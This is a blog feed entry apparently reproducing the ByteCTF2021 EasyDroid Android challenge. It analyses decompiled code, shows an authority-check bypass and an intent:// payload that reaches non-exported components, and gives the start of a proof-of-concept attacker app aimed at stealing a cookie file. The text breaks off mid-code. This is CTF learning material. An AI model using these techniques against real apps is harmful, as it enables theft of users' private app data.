<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Matriy&#39;s blog</title>
  
  
  <link href="http://matriy330.github.io/atom.xml" rel="self"/>
  
  <link href="http://matriy330.github.io/"/>
  <updated>2026-01-21T15:08:19.831Z</updated>
  <id>http://matriy330.github.io/</id>
  
  <author>
    <name>Matriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ByteCTF2021 EasyDroid复现</title>
    <link href="http://matriy330.github.io/d5a3f640/"/>
    <id>http://matriy330.github.io/d5a3f640/</id>
    <published>2026-01-21T15:08:09.000Z</published>
    <updated>2026-01-21T15:08:19.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-EasyDroid复现"><a href="#ByteCTF2021-EasyDroid复现" class="headerlink" title="ByteCTF2021 EasyDroid复现"></a>ByteCTF2021 EasyDroid复现</h1><p>依旧学习<a href="https://blog.lleavesg.top/article/ByteCTF-2021-EasyDroid#b70829973bb54b60be5aeab8dc18c5a5">ByteCTF2021 EasyDroid复现 | LLeaves Blog</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.easydroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;27&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Easydroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.TestActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.easydroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>含义</th><th></th></tr></thead><tbody><tr><td><code>debuggable=&quot;true&quot;</code></td><td>可调试</td><td><strong>可直接用 JDWP &#x2F; Android Studio 调试</strong></td></tr><tr><td><code>allowBackup=&quot;true&quot;</code></td><td>允许 adb 备份</td><td><code>adb backup</code> 可能直接导出数据</td></tr><tr><td><code>usesCleartextTraffic=&quot;true&quot;</code></td><td>允许 HTTP 明文</td><td>抓包 &#x2F; 篡改流量</td></tr></tbody></table><p><code>exported=&quot;true&quot;</code>：任何应用 &#x2F; adb 都能启动它</p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.bytectf.easydroid/.MainActivity</span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.easydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebViewClient;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>) &amp;&amp; data.getScheme().equals(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">            webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123; <span class="comment">// from class: com.bytectf.easydroid.MainActivity.1</span></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                    <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            MainActivity.<span class="built_in">this</span>.startActivity(Intent.parseUri(url, <span class="number">1</span>));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            setContentView(webView);</span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.loadUrl(data.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebView webView = new WebView(getApplicationContext());</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(true);</span><br><span class="line">webView.loadUrl(data.toString());</span><br></pre></td></tr></table></figure><p>WebView，<strong>JS 开启</strong>，加载可控制的 URL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">    <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">        MainActivity.<span class="built_in">this</span>.startActivity(</span><br><span class="line">            Intent.parseUri(url, <span class="number">1</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>只要 WebView 中出现 <code>intent://</code> 链接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(url);</span><br></pre></td></tr></table></figure><p>把 URL 字符串解析成 Uri 对象</p><p>用于读取 scheme（协议）、host 等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (uri.getScheme().equals(&quot;intent&quot;)) &#123;</span><br></pre></td></tr></table></figure><p>判断 URL 的 scheme 是否是 intent</p><p>intent:&#x2F;&#x2F; 是 Android 特有协议</p><p>用于在网页&#x2F;应用之间触发 Android Intent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">intent://test#Intent;</span><br><span class="line">action=com.bytectf.SET_FLAG;</span><br><span class="line">S.flag=xxx;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>App 会 <strong>直接执行 startActivity(Intent)</strong></p><p><strong>没有任何白名单和校验</strong></p><p>此外也存在风险点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.getAuthority().contains(&quot;toutiao.com&quot;) &amp;&amp; data.getScheme().equals(&quot;http&quot;)</span><br></pre></td></tr></table></figure><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://toutiao.com</span><br><span class="line">http://app.toutiao.com</span><br><span class="line">http://evil.toutiao.com.attacker.com</span><br></pre></td></tr></table></figure><blockquote><p><strong>在内部校验</strong><code>intent</code> <strong>并且可以进行跳转。因此这里存在攻击点，即可以绕过</strong><code>**getAuthority** </code> <strong>校验加载恶意html，在html内部使用</strong><code>JavaScript</code> <strong>构造重定向请求，然后跳转到指定的非导出Activity</strong></p></blockquote><h3 id="TestActivity"><a href="#TestActivity" class="headerlink" title="TestActivity"></a>TestActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.easydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.loadUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会无条件加载intent extra url里的的页面</p><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><blockquote><p>FlagReceiver 通过 CookieManager 将 <code>flag</code> 写入 <code>https://tiktok.com/</code> 域的 Cookie 中，但写入值为 <code>Base64(flag)</code>。WebView 会将该 Cookie 持久化保存到应用私有目录 <code>/data/data/com.bytectf.easydroid/app_webview/</code> 下的 Cookies 数据库文件中。因此在成功触发 Receiver 写入后，攻击目标是读取该 Cookies 文件并提取 <code>flag</code> 字段，再进行 Base64 解码得到原始 flag。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.easydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.webkit.CookieManager;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag2</span> <span class="operator">=</span> Base64.encodeToString(flag.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="number">0</span>);</span><br><span class="line">                <span class="type">CookieManager</span> <span class="variable">cookieManager</span> <span class="operator">=</span> CookieManager.getInstance();</span><br><span class="line">                cookieManager.setCookie(<span class="string">&quot;https://tiktok.com/&quot;</span>, <span class="string">&quot;flag=&quot;</span> + flag2);</span><br><span class="line">                Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="环境广播flag的补充"><a href="#环境广播flag的补充" class="headerlink" title="环境广播flag的补充"></a>环境广播flag的补充</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am broadcast -W -a &quot;com.wuhengctf.SET_FLAG&quot; -n &quot;com.bytectf.easydroid/.FlagReceiver&quot; -e &#x27;flag&#x27; &#x27;flag&#123;eeeeeeee&#125;&#x27;</span><br></pre></td></tr></table></figure><p>解释一下</p><p>同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">i.setAction(&quot;com.wikehend.SET_FLAG&quot;);</span><br><span class="line">i.setComponent(&quot;com.bytectf.babydroid/.FlagReceiver&quot;);</span><br><span class="line">i.putExtra(&quot;flag&quot;, &quot;flag&#123;eeeeeeee&#125;&quot;);</span><br></pre></td></tr></table></figure><p>以com.wikehend.SET_FLAG的身份让 Android 系统，显式调用 <code>com.bytectf.babydroid.FlagReceiver</code>，并传一个字符串参数 <code>flag=flag&#123;eeeeeeee&#125;</code>，让它去执行 <code>onReceive()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120202340503.png" alt="image-20260120202340503"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>MainActivity.shouldOverrideUrlLoading()，是 <strong>WebView 的URL 跳转拦截回调</strong>。</p><p>当 WebView 准备加载一个新的 URL 时，先问：要不要自己加载？还是来接管？</p><table><thead><tr><th>返回值</th><th>含义</th></tr></thead><tbody><tr><td>true</td><td>已经处理了这个 URL，WebView 不要再加载</td></tr><tr><td>false</td><td>WebView正常加载</td></tr></tbody></table><p>可以编写个Demo验证思路</p><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.pwneasydroid&quot;</span>,<span class="string">&quot;com.bytectf.pwneasydroid.Second&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;http://toutiao.com@xxx.xxx.xxx.xxx/evil.html&quot;</span>);</span><br><span class="line">        intent.setData(data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里照抄debug.apk里的MainActivity内容</p><p>Second:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Second</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_second);</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;second&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span>(data==<span class="literal">null</span>)&#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(TAG,data.getAuthority());</span><br><span class="line">        <span class="keyword">if</span>(data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>) &amp;&amp; data.getScheme().equals(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">            webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">                <span class="meta">@SuppressLint(&quot;WrongConstant&quot;)</span></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                    Log.d(TAG,<span class="string">&quot;shouldOverrideUrlLoading called&quot;</span>);</span><br><span class="line">                    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                    <span class="keyword">if</span>(uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>))&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            startActivity(Intent.parseUri(url,<span class="number">1</span>));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            setContentView(webView);</span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.loadUrl(data.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Third:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwneasydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Third</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span 